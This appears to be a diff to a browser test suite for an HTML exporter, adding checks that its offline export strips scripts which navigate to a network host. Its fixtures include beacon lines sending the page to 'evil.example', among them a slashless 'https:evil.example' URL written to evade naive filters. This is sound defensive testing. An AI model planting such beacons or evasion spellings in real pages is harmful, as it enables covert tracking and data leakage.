@@ -616,6 +616,23 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
 </script>
 <script>
 (function () {
+  // A URL literal spelled WITHOUT the slashes after the scheme. A browser resolves
+  // "https:evil.example/x" to "https://evil.example/x", so this beacons exactly as well as the
+  // direct assignment above while needing no aliasing, no computed access and no obfuscation.
+  window.__cmhSchemeOnlyExfilRan = true;
+  if (location.protocol === "file:") location.href = "https:evil.example/scheme-only";
+})();
+</script>
+<script>
+(function () {
+  // Control: a bare "https:" scheme string and a COMPARISON against a scheme-only URL. Widening
+  // the URL literal to catch the beacon above must not start deleting these.
+  window.__cmhSchemeStringKept = "https:";
+  if (location.href === "https:api.example.org/v1") document.title = "same";
+})();
+</script>
+<script>
+(function () {
   // Control: mentions both a navigation object and a network URL literal, but never
   // navigates to one. A strip that deleted this would break benign authored documents.
   window.__cmhBenignLocationKept = true;
@@ -666,14 +683,16 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     const exportedHtml = await capturedDownloadText(page);
     expect(exportedHtml).not.toContain("evil.example");
     expect(exportedHtml).toContain("window.__cmhBenignLocationKept = true");
+    expect(exportedHtml).toContain('window.__cmhSchemeStringKept = "https:"');
     // The costlier failure direction: a benign script that merely SHADOWS `location` / `open`
     // with local bindings must survive intact, or an ordinary authored document is silently
     // broken by the export.
     expect(exportedHtml).toContain("window.__cmhLocalShadowKept = location");
     expect(exportedHtml).toContain("window.__cmhShadowedHrefKept = location.href");
     // Removing a script is content loss, so the user is told rather than left to guess - and the
-    // COUNT must be right, or a miscount regression would read as a pass.
-    await expect(page.locator("#toast")).toContainText("3 scripts that load or navigate to the network were removed.");
+    // COUNT must be right, or a miscount regression would read as a pass. Matched with a word
+    // boundary, since a plain substring would also be satisfied by "14 scripts ... removed.".
+    await expect(page.locator("#toast")).toContainText(/\b4 scripts that load or navigate to the network were removed\./);
     // A navigation that does still happen (a user-clicked link, or a script that builds the
     // URL dynamically) must at least not leak where it came from. The fixture authors a
     // PERMISSIVE `unsafe-url` policy both as a document meta and on the anchor itself, so this
@@ -691,21 +710,27 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
 
     // The strict validator must not bless a hand-authored offline file that keeps the same
     // shape: the strip and the gate have to agree, or the gate certifies a file the exporter
-    // no longer protects.
-    const smuggledPath = path.join(outDir, "offline-navigation-smuggled.html");
-    fs.writeFileSync(smuggledPath, exportedHtml.replace(
-      "</body>",
-      '<script>location.href = "https://evil.example/steal";</script></body>'));
-    let smuggledOut = "";
-    try {
-      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", smuggledPath], { cwd: SKILL, stdio: "pipe" });
-      throw new Error("the strict validator accepted a smuggled top-level navigation");
-    } catch (e) {
-      smuggledOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
+    // no longer protects. The scheme-only spelling is checked in the same direction, since a
+    // gate that only knew `https://` would certify exactly what the exporter now removes.
+    const smuggles = [
+      'location.href = "https://evil.example/steal";',
+      'location.href = "https:evil.example/steal";',
+    ];
+    for (const [i, smuggle] of smuggles.entries()) {
+      const smuggledPath = path.join(outDir, "offline-navigation-smuggled-" + i + ".html");
+      fs.writeFileSync(smuggledPath, exportedHtml.replace(
+        "</body>", "<script>" + smuggle + "</script></body>"));
+      let smuggledOut = "";
+      try {
+        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", smuggledPath], { cwd: SKILL, stdio: "pipe" });
+        throw new Error("the strict validator accepted a smuggled top-level navigation: " + smuggle);
+      } catch (e) {
+        smuggledOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
+      }
+      // Match the specific navigation error, not just any validation failure - otherwise an
+      // unrelated breakage would read as this gate working.
+      expect(smuggledOut).toMatch(/matches a direct top-level navigation to a network URL/i);
     }
-    // Match the specific navigation error, not just any validation failure - otherwise an
-    // unrelated breakage would read as this gate working.
-    expect(smuggledOut).toMatch(/matches a direct top-level navigation to a network URL/i);
 
     ctx2 = await browser.newContext();
     const page2 = await ctx2.newPage();
@@ -722,6 +747,8 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
         exfilRan: window.__cmhExfilRan === true,
         openExfilRan: window.__cmhOpenExfilRan === true,
         chainExfilRan: window.__cmhChainExfilRan === true,
+        schemeOnlyExfilRan: window.__cmhSchemeOnlyExfilRan === true,
+        schemeStringKept: window.__cmhSchemeStringKept,
         benignKept: window.__cmhBenignLocationKept === true,
         localShadowKept: window.__cmhLocalShadowKept,
         localOpenArg: window.__cmhLocalOpenArg,
@@ -736,6 +763,8 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     expect(state.exfilRan).toBe(false);
     expect(state.openExfilRan).toBe(false);
     expect(state.chainExfilRan).toBe(false);
+    expect(state.schemeOnlyExfilRan).toBe(false);
+    expect(state.schemeStringKept).toBe("https:");
     expect(state.benignKept).toBe(true);
     expect(state.localShadowKept).toBe("https://api.example.org/v1");
     expect(state.localOpenArg).toBe("https://docs.example.org/guide");
@@ -1980,7 +2009,7 @@ test("CMH-OFFLINE-04: a decoy runnable script cannot bypass the offline strips b
     expect(exportedHtml).not.toContain("decoy-src.js");
     // Both outcomes are named to the author rather than left to be discovered.
     const toast = page.locator("#toast");
-    await expect(toast).toContainText("2 scripts that load or navigate to the network were removed.");
+    await expect(toast).toContainText(/\b2 scripts that load or navigate to the network were removed\./);
     await expect(toast).toContainText("4 scripts carrying a reserved commentable-html data id were kept as inert data.");
 
     const exportedPath = path.join(outDir, "offline-reserved-decoys.html");
